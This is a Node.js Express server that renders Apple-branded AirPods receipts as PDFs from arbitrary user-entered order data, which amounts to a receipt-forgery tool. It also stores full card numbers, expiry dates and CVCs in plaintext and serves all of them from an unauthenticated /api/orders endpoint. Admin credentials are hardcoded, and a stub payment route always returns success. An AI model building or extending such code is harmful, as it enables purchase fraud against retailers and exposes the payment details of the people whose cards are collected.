require('dotenv').config();
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const puppeteer = require('puppeteer');
const app = express();

// Add EJS as template engine
app.set('view engine', 'ejs');

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
    }
}));

// Admin credentials
const ADMIN_USERNAME = 'Ronan';
const ADMIN_PASSWORD = 'freepunch25';

// Admin routes
app.get('/admin', async (req, res) => {
    const isLoggedIn = req.session.isAdmin || false;
    let orders = [];
    
    if (isLoggedIn) {
        orders = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM orders ORDER BY date DESC', [], (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
    }
    
    res.render('admin', { 
        isLoggedIn, 
        orders,
        error: req.session.error 
    });
    req.session.error = null;
});

app.post('/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        res.redirect('/admin');
    } else {
        req.session.error = 'Invalid credentials';
        res.redirect('/admin');
    }
});

app.post('/admin/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/admin');
});

// Initialize SQLite database
const db = new sqlite3.Database('store.db', (err) => {
    if (err) {
        console.error('Error opening database:', err);
    } else {
        console.log('Connected to SQLite database');
        // Create orders table if it doesn't exist
        db.run(`CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date TEXT,
            status TEXT,
            email TEXT,
            cardNumber TEXT,
            cardExpiry TEXT,
            cardHolder TEXT,
            cvc TEXT,
            productName TEXT,
            productPrice TEXT,
            billing1 TEXT,
            billing2 TEXT,
            billing3 TEXT,
            billing4 TEXT,
            billing5 TEXT,
            address1 TEXT,
            address2 TEXT,
            address3 TEXT,
            address4 TEXT,
            address5 TEXT
        )`);
    }
});

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/orders', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'orders.html'));
});

// API endpoint to save order
app.post('/api/orders', (req, res) => {
    const {
        email, cardNumber, expiryDate, cardHolder, cvc,
        productName, productPrice,
        billing1, billing2, billing3, billing4, billing5,
        address1, address2, address3, address4, address5,
        date, status
    } = req.body;

    const sql = `INSERT INTO orders (
        date, status, email, cardNumber, cardExpiry, cardHolder, cvc,
        productName, productPrice,
        billing1, billing2, billing3, billing4, billing5,
        address1, address2, address3, address4, address5
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;

    db.run(sql, [
        date, status, email, cardNumber, expiryDate, cardHolder, cvc,
        productName, productPrice,
        billing1, billing2, billing3, billing4, billing5,
        address1, address2, address3, address4, address5
    ], function(err) {
        if (err) {
            console.error(err);
            res.status(500).json({ error: 'Failed to save order' });
            return;
        }
        res.json({ success: true, orderId: this.lastID });
    });
});

// API endpoint to get orders
app.get('/api/orders', (req, res) => {
    db.all('SELECT * FROM orders ORDER BY date DESC', [], (err, rows) => {
        if (err) {
            res.status(500).json({ error: 'Failed to fetch orders' });
        } else {
            res.json(rows);
        }
    });
});

// Add this route to handle order status updates
app.put('/api/orders/:id/status', async (req, res) => {
    if (!req.session.isAdmin) {
        return res.status(403).json({ error: 'Unauthorized' });
    }

    const { id } = req.params;
    const { status } = req.body;

    db.run('UPDATE orders SET status = ? WHERE id = ?', [status, id], (err) => {
        if (err) {
            console.error(err);
            res.status(500).json({ error: 'Failed to update order status' });
        } else {
            res.json({ success: true });
        }
    });
});

// Add this route to handle receipt generation
app.post('/api/generate-receipt', async (req, res) => {
    try {
        const { preview, ...data } = req.body;
        
        let template = fs.readFileSync(path.join(__dirname, 'templates', 'apple.html'), 'utf8');

        // Add watermark CSS and HTML for preview
        if (preview) {
            template = template.replace('</head>',
                `<style>
                    .watermark {
                        position: fixed;
                        top: 50%;
                        left: 50%;
                        transform: translate(-50%, -50%) rotate(-45deg);
                        font-size: 120px;
                        color: rgba(128, 128, 128, 0.2);
                        pointer-events: none;
                        z-index: 1000;
                        font-family: Arial, sans-serif;
                        font-weight: bold;
                        white-space: nowrap;
                    }
                </style>
                </head>`
            );
            template = template.replace('<body>', '<body><div class="watermark">PREVIEW</div>');
        }

        // First replace the images with absolute URLs
        template = template
            .replace(/src="apple_icon_2x\.png"/g, 'src="https://ubiquitous-sable-21057e.netlify.app/icon.png"')
            .replace(/src="airpods\.png"/g, 'src="https://ubiquitous-sable-21057e.netlify.app/airpods.png"')
            .replace(/src="spacer\.gif"/g, 'src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"');

        // Then replace all the placeholders with form data
        template = template
            .replace(/ORDERNUMBER/g, data.orderNumber || `APPLE${Date.now()}`)
            .replace(/DATE/g, new Date(data.orderDate || Date.now()).toLocaleDateString())
            .replace(/PRODUCT_NAME/g, data.productName || 'AirPods')
            .replace(/PRODUCT_PRICE/g, `$${(parseFloat(data.productPrice) || 10.00).toFixed(2)}`)
            .replace(/SHIPPING/g, `$${(parseFloat(data.shippingPrice) || 0.00).toFixed(2)}`)
            .replace(/TOTAL/g, `$${((parseFloat(data.productPrice) || 10.00) + (parseFloat(data.shippingPrice) || 0.00)).toFixed(2)}`)
            .replace(/EMAIL/g, data.email || '')
            // Billing info
            .replace(/BILLING1/g, data.billing1 || '')
            .replace(/BILLING2/g, data.billing2 || '')
            .replace(/BILLING3/g, data.billing3 || '')
            .replace(/BILLING4/g, data.billing4 || '')
            .replace(/BILLING5/g, data.billing5 || '')
            // Shipping info - make sure these match exactly with your form field names
            .replace(/ADDRESS1/g, data.address1 || '')
            .replace(/ADDRESS2/g, data.address2 || '')
            .replace(/ADDRESS3/g, data.address3 || '')
            .replace(/ADDRESS4/g, data.address4 || '')
            .replace(/ADDRESS5/g, data.address5 || '');

        // Remove any WebSocket-related scripts and toolbars
        template = template.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
        template = template.replace(/<div[^>]*id="yt_article_summary_widget_wrapper"[^>]*>.*?<\/div>/gs, '');
        template = template.replace(/<div[^>]*id="naptha_container[^>]*>.*?<\/div>/gs, '');

        if (!preview) {
            // Generate PDF with specific settings using Puppeteer
            const browser = await puppeteer.launch({ headless: 'new' });
            const page = await browser.newPage();
            
            // Set viewport and content
            await page.setViewport({ width: 768, height: 1086 }); // A4 at 72 DPI
            await page.setContent(template);

            // Before generating PDF, add this CSS to ensure content fits on one page
            await page.addStyleTag({
                content: `
                    body {
                        margin: 0;
                        padding: 0;
                        zoom: 0.75;
                    }
                    * {
                        page-break-inside: avoid;
                    }
                `
            });

            // Generate PDF with specific settings
            const pdf = await page.pdf({
                width: '210mm',
                height: '297mm',
                printBackground: true,
                margin: {
                    top: '10mm',
                    right: '10mm',
                    bottom: '10mm',
                    left: '10mm'
                },
                preferCSSPageSize: true,
                scale: 0.75, // Scale down to fit on one page
                displayHeaderFooter: false,
                format: 'A4'
            });

            await browser.close();

            // Send PDF
            res.contentType('application/pdf');
            res.send(pdf);
        } else {
            // Send HTML preview
            res.send(template);
        }

    } catch (error) {
        console.error('Receipt generation error:', error);
        res.status(500).send('Failed to generate receipt');
    }
});

// Add payment processing route
app.post('/api/process-payment', async (req, res) => {
    // Add your payment processing logic here
    // For demo, we'll just return success
    res.json({ success: true });
});

// Add preview generation endpoint
app.post('/generate-preview', (req, res) => {
    try {
        const { preview, ...data } = req.body;
        
        // Convert price strings to numbers and handle invalid inputs
        const productPrice = parseFloat(data.productPrice) || 10.00;
        const shippingPrice = parseFloat(data.shippingPrice) || 0.00;
        
        let template = fs.readFileSync(path.join(__dirname, 'templates', 'apple.html'), 'utf8');

        // Replace image paths with absolute URLs
        template = template
            .replace(/src="apple_icon_2x\.png"/g, 'src="https://ubiquitous-sable-21057e.netlify.app/icon.png"')
            .replace(/src="airpods\.png"/g, 'src="https://ubiquitous-sable-21057e.netlify.app/airpods.png"')
            .replace(/src="spacer\.gif"/g, 'src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"');

        // Replace placeholders with form data
        template = template
            .replace(/ORDERNUMBER/g, data.orderNumber || `APPLE${Date.now()}`)
            .replace(/DATE/g, new Date(data.orderDate || Date.now()).toLocaleDateString())
            .replace(/PRODUCT_NAME/g, data.productName || 'AirPods')
            .replace(/PRODUCT_PRICE/g, `$${productPrice.toFixed(2)}`)
            .replace(/SHIPPING/g, `$${shippingPrice.toFixed(2)}`)
            .replace(/TOTAL/g, `$${(productPrice + shippingPrice).toFixed(2)}`)
            .replace(/EMAIL/g, data.email || '')
            .replace(/BILLING1/g, data.billing1 || '')
            .replace(/BILLING2/g, data.billing2 || '')
            .replace(/BILLING3/g, data.billing3 || '')
            .replace(/BILLING4/g, data.billing4 || '')
            .replace(/BILLING5/g, data.billing5 || '')
            .replace(/ADDRESS1/g, data.address1 || '')
            .replace(/ADDRESS2/g, data.address2 || '')
            .replace(/ADDRESS3/g, data.address3 || '')
            .replace(/ADDRESS4/g, data.address4 || '')
            .replace(/ADDRESS5/g, data.address5 || '');

        res.send(template);
    } catch (error) {
        console.error('Preview generation error:', error);
        res.status(500).send('Failed to generate preview');
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
